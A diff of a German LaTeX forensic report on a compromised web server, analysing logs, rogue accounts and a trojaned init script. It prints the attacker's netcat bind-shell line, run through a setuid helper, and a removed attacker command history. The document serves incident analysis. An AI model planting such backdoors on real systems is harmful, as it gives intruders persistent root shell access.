@@ -1,31 +1,28 @@
 \section{Durchführung}
 \subsection{Abarbeiten der Tests}
 Da der Geschädigte sagte, dass seine letzten Arbeiten am 28.01.2010 um 22:15 Uhr stattfanden bevor er gemerkt hat, dass mit dem Webserver etwas nicht stimmt, wurde im \texttt{auth.log} nach auffaelligen Logins, primär, nach diesem Zeitraum gesucht.
-Hier ein Auszug aus der Datei:
+Hier ein Auszug aus der Datei \ref{authlog}:
 \lstset{basicstyle=\footnotesize, breaklines=true, breakatwhitespace=true}
 \lstinputlisting{snippets/auth.log}
 
-Als anschließend die datei \texttt{/etc/shadow} durchsucht wurde, wurden die Benutzer \texttt{evil, evil2} und \texttt{evil3} gefunden. Hier der Auszug:
-%\lstset{basicstyle=\footnotesize, breaklines=true, breakatwhitespace=true}
-%\lstinputlisting{snippets/shadow}
-% Michl hat verrafft wie er die erste partition gemounted hat deshalb muss ich mal warten
+Als anschließend die datei \texttt{/etc/passwd} durchsucht wurde, wurden die Benutzer \texttt{evil, evil2} und \texttt{evil3} gefunden. Hier der Auszug \ref{passwd}:
+\lstset{basicstyle=\footnotesize, breaklines=true, breakatwhitespace=true}
+\lstinputlisting{snippets/passwd}
+
 
 Die Liste der geladenen Module in \texttt{/proc/modules} enhaelt keine Auffälligen.
 \pagebreak
 \subsection{Auswerten der Tests}
-Als erstes beschäftigte man sich mit den ungewöhnlichen Systembenutzern \texttt{evil, evil2} und \texttt{evil3}. Eine sofortige Auffälligkeit der drei Benutzer in der \texttt{/etc/shadow} Datei ist, dass sie im Feld der letzten Passwortänderung, den selben Wert aufweisen wie die Systembenutzer. Dies suggeriert den selben Erstellungszeitpunkt wie diese ist aber insofern unglaubwürdig da in der erstellten Timeline der letzte \texttt{modification/change} Timestamp der \texttt{/etc/shadow} Datei am \texttt{Thu Jan 28 2010 22:16:33} ist. Was wiederum wiedersprüchlich ist mit der \texttt{auth.log} Log-Datei in der ein neuer Benutzer namens \texttt{evil} erst \texttt{Jan 28 22:50:04} erstellt wurde. Es ist zum einen Möglich mit \texttt{root} Rechten die \texttt{/etc/shadow} Datei händisch zu manipulieren sodass beliebige Werte eingetragen werden können, weiterhin ist es mit relativ simplen C-Programmen möglich MAC-Timestamps zu manipulieren.
+Als erstes beschäftigte man sich mit den ungewöhnlichen Systembenutzern \texttt{evil, evil2} und \texttt{evil3}. Eine sofortige Auffälligkeit der drei Benutzer in der \texttt{/etc/shadow} \ref{shadow} Datei ist, dass sie im Feld der letzten Passwortänderung, den selben Wert aufweisen wie die Systembenutzer. Dies suggeriert den selben Erstellungszeitpunkt wie diese ist aber insofern unglaubwürdig da in der erstellten Timeline der letzte \texttt{modification/change} Timestamp der \texttt{/etc/shadow} \ref{shadow} Datei am \texttt{Thu Jan 28 2010 22:16:33} ist. Was wiederum wiedersprüchlich ist mit der \texttt{auth.log} \ref{authlog} Log-Datei in der ein neuer Benutzer namens \texttt{evil} erst \texttt{Jan 28 22:50:04} erstellt wurde. Es ist zum einen Möglich mit \texttt{root} Rechten die \texttt{/etc/shadow} \ref{shadow} Datei händisch zu manipulieren sodass beliebige Werte eingetragen werden können, weiterhin ist es mit relativ simplen C-Programmen möglich MAC-Timestamps zu manipulieren.
 
 Eine weitere Auffälligkeit findet sich im Auszug der Ausgabe des Befehls \texttt{ls -lahd /home/}:
 \begin{verbatim}
 drwxr-xr-x 2 1001 root 4,0K Jan 28 2010 evil
 drwxr-xr-x 2 1003 root 4,0K Jan 28 2010 evil3
 \end{verbatim}
-Die Benutzer \texttt{evil} und \texttt{evil3} sind mit ihren \texttt{UID}s und nicht Ihren Benutzernamen angezeigt. Des weiteren hat \texttt{evil2} kein eigenes Verzeichniss im \texttt{/home/} Directory. Ein Blick in die \texttt{/etc/passwd} Datei zeigt, dass sich die Benutzer \texttt{evil} und \texttt{evil2} ein \texttt{/home/}-Verzeichniss teilen.
-\begin{verbatim}
-evil:x:1001:0::/home/evil:/bin/bash
-evil2:x:1002:0::/home/evil:/bin/bash
-evil3:x:1003:0::/home/evil3:/bin/bash
-\end{verbatim}
+Die Benutzer \texttt{evil} und \texttt{evil3} sind mit ihren \texttt{UID}s und nicht Ihren Benutzernamen angezeigt. Des weiteren hat \texttt{evil2} kein eigenes Verzeichniss im \texttt{/home/} Directory. Ein Blick in die \texttt{/etc/passwd}\ref{passwd} Datei zeigt, dass sich die Benutzer \texttt{evil} und \texttt{evil2} ein \texttt{/home/}-Verzeichniss teilen.
+\lstset{basicstyle=\footnotesize, breaklines=true, breakatwhitespace=true}
+\lstinputlisting{snippets/passwd}
 
 Ein \texttt{ls -lah /home/evil/} zeigt folgende Ausgabe:
 \begin{verbatim}
@@ -39,27 +36,19 @@ drwxr-xr-x 5 root root 4,0K Jan 28  2010 ..
 -rw-r--r-- 1 1001 root  675 Mai 12  2008 .profile
 \end{verbatim}
 
-Als erstes wurde die \texttt{networking} Datei näher betrachtet. Hierbei handelt es sich um ein Skript welches wahrscheinlich das Original unter \texttt{/etc/init.d/} ersetzen soll. Sollte dies der Fall sein und das Skript wird mit dem Parameter \texttt{start} aufgerufen, wird folgende Zeile ausgeführt:
+Als erstes wurde die \texttt{networking} Datei näher betrachtet. Hierbei handelt es sich um ein Skript welches wahrscheinlich das Original unter \texttt{/etc/init.d/} ersetzen soll. Ein \texttt{diff /etc/init.d/networking /home/evil/networking} bestätigte diese vermutung. Wenn nun das Skript mit dem Parameter \texttt{start} aufgerufen wird, wird unter den normalen Befehlen ausserdem folgende Zeile ausgeführt \hl{referenz auf networking}:
 \begin{verbatim}
-/usr/local/bin/mysudo "/var/www/upload/netcat -nvv -l -e /bin/bash -p 32323"
+/usr/local/bin/mysudo "/var/www/upload/netcat -nvv \
+											 -l \
+											 -e /bin/bash \
+											 -p 32323"
 \end{verbatim}
 Diese Zeile führt das Program \texttt{mysudo} aus und öffnet eine \texttt{netcat} Listening Verbindung auf dem Port 32323 welche mit dem Schalter \texttt{-e} nach der Verbindung eine \texttt{bash} Shell öffnet.
-%Strace von steph hier einbauen?
-\pagebreak Über die \texttt{.bash\_history} kann man die Befehle welche der Benutzer absetzte einsehen:
-\begin{verbatim}
-ls 
-ls -l 
-mysudo whoami 
-cd /etc/init.d/ 
-ls 
-touch bdstart.sh 
-cd 
-cp /etc/init.d/hostname.sh bdstart.sh 
-vim bdstart.sh 
-cp /etc/init.d/networking . 
-vim networking 
-mysudo "cp ./networking /etc/init.d/" 
-ls -l /etc/init.d/ 
-ls -l /etc/
-\end{verbatim}
-Der Umstand, dass diese ebenfalls von Angreifern modifizierbar ist muss berücksichtigt werden. Manipulationen an dieser Datei sind ist anhand der MAC-Timestamps nicht nachvollziehbar. %Dazu schreiben warum
+
+Nach der Feststellung, dass der Angreifer mit \texttt{root}-Rechten agiert hat wurde die \texttt{.bash\_history}\ref{historyroot} des \texttt{root}-Benutzers untersucht.
+Aufmerksamkeit erregte die Bearbeitung eines \texttt{mysudo} Programs.
+Bei näherer Untersuchung wurde festgestellt, dass einer Binärdatei namens \texttt{mysudo} das \texttt{setuid} Bit gesetzt wurde, der Eigentümer auf \texttt{root:root} geändert und sie vom \texttt{/home/}-Verzeichniss des Benutzers \texttt{itf} nach \texttt{/usr/local/bin} verschoben wurde, was sie ausführbar für jeden Benutzer des Systems macht. Diese Aktionen wurden ausgeführt bevor der Angreifer auf das System kam \hl{referenz timestamps} was vermuten läßt, dass der Administrator diese ausgeführt hat.
+
+Über die \texttt{.bash\_history} kann man die Befehle welche der Benutzer absetzte einsehen. \ref{historyevil}
+Der Umstand, dass diese ebenfalls von Angreifern modifizierbar ist muss berücksichtigt werden. Manipulationen an dieser Datei sind ist anhand der MAC-Timestamps nicht nachvollziehbar da bei jeder Ausführung eines Befehls der \texttt{modification} und \texttt{change} Timestamp gestzt werden.\\
+
